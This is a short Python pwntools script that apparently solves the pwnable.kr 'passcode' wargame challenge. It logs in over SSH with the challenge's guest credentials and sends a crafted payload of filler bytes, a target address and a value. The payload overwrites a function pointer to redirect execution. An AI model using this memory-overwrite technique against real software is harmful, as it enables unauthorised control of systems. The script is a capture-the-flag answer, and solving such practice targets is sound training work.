from pwn import *

shell = ssh(host='pwnable.kr',port=2222,user='passcode',password='guest')


io = shell.process("./passcode")
str1 = "134514147" 
str2 = "134520848"
io.sendline(b'\x01'*96 + b'\x04\xa0\x04\x08')
io.sendline(b'134520848')
data = io.recvall().decode('utf-8')
print(data)